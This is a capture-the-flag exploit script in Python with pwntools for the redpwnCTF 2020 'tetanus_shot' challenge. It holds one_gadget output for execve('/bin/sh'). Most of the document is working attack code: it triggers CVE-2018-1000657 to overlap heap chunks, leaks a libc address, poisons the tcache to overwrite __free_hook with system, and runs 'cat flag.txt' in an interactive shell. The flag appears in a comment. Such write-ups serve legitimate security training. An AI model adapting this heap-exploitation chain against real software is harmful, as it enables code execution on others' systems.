#0xe6b93 execve("/bin/sh", r10, r12)
#constraints:
#  [r10] == NULL || r10 == NULL
#  [r12] == NULL || r12 == NULL
#
#0xe6b96 execve("/bin/sh", r10, rdx)
#constraints:
#  [r10] == NULL || r10 == NULL
#  [rdx] == NULL || rdx == NULL
#
#0xe6b99 execve("/bin/sh", rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL
#  [rdx] == NULL || rdx == NULL
#
#0x10afa9 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL

from pwn import *
from sys import argv

list_count = 0

def create(p, size):
    global list_count
    p.sendlineafter('7. Exit', '1')
    p.sendlineafter('big should this list be?', str(size))
    p.recvuntil('Done!')
    list_count += 1
    return list_count - 1

def delete(p, index):
    global list_count
    log.info(f'Deleting {index}')
    p.sendlineafter('7. Exit', '2')
    p.sendlineafter('Which list do you want to delete?', str(index))
    p.recvuntil('Done!')
    list_count -= 1


def append(p, list_index, count, elements):
    p.sendlineafter('7. Exit', '5')
    p.sendlineafter('Which list do you want to append to?', str(list_index))
    p.sendlineafter('How many elements do you want to append?', str(count))

    for x in elements:
        p.sendlineafter('What value should be inserted?', str(x))

def prepend(p, list_index, count, elements):
    p.sendlineafter('7. Exit', '4')
    p.sendlineafter('Which list do you want to prepend to?', str(list_index))
    p.sendlineafter('How many elements do you want to prepend?', str(count))

    for x in elements:
        p.sendlineafter('What value should be inserted?', str(x))

def view(p, list_index, element_index):
    p.sendlineafter('7. Exit', '6')
    p.sendlineafter('Which list do you want to view?', str(list_index))
    p.sendlineafter('Which element do you want to view?', str(element_index))
    p.recvuntil('Value: ')
    return int(p.recvline().decode('ascii'))


def edit(p, list_index, element_index, value):
    p.sendlineafter('7. Exit', '3')
    p.sendlineafter('Which list do you want to edit?', str(list_index))
    p.sendlineafter('Okay, which element do you want to edit?', str(element_index))
    p.sendlineafter('What do you want to set it to?', str(value))


if 'remote' in argv:
    p = remote('2020.redpwnc.tf', 31754)
elif 'debug' in argv:
    p = gdb.debug('./tetanus_shot', 'c')
else:
    p = process('./tetanus_shot')

libc_elf = ELF('./libc.so.6')

# first chunk will be seperated from the others :/
create(p, 7)

# the chunks we play with
a = create(p, 31)
b = create(p, 7) 
c = create(p, 160) 
d = create(p, 160) # just to block consolidation of chunk c

# using CVE-2018-1000657 on list a
# changing b's chunk size to something big so that it clips with c
# i need to create 15 elements. 8 prepend + 7 append
append(p, a, 7, [0x100 for x in range(0, 7)])
prepend(p, a, 8, [x for x in range(0+7, 7+7+1)])
prepend(p, a, 16, [x for x in range(50, 50+16)])

# filling c with valid chunk sizes to avoid realloc(): invalid next size
append(p, c, 63, [0x100 for x in range(0, 63)])

# giving too much to eat to b, realloc will be called
# chunk stays the same because we modified its size
# it now clips with c
append(p, b, 15, [0x811 if x % 2 == 1 else 0x810 for x in range(200, 200+15)])

# freeing c
delete(p, c)

# leaking pointer at c through b
libc_leak = view(p, b, 11) - (0x7feda564abe0 - 0x00007feda5460000)
free_hook = libc_leak + libc_elf.sym['__free_hook']
system = libc_leak + libc_elf.sym['system']
log.info(f'Libc: {hex(libc_leak)}')

# now let's attack tcache
# emptying bins so that x and y are next to each other
create(p, 31)
create(p, 31)
create(p, 31)
x = create(p, 31)
y = create(p, 31)
append(p, y, 3, [0xbbbbbb, 0xcccccc, 0xddddd]) #just to recognize it
delete(p, y)


# using CVE to overflow x onto y, and overwriting its next pointer
# i need to create 15 elements. 8 prepend + 7 append
append(p, x, 7, [free_hook for x in range(0, 7)])
prepend(p, x, 8, [free_hook for x in range(0+7, 7+7+1)])
append(p, x, 16, [free_hook for x in range(50, 50+16)])


create(p, 31)
hook_chunk = create(p, 31)
p.sendlineafter('7. Exit', '5')
p.sendlineafter('Which list do you want to append to?', str(hook_chunk))
p.sendlineafter('How many elements do you want to append?', str(1))
p.sendlineafter('What value should be inserted?', str(system) + '\n cat flag.txt')
p.interactive() # flag{mem0ry_safe_means_mem0ry_s4f3_except_f0r_when_1t_d0e5nt}
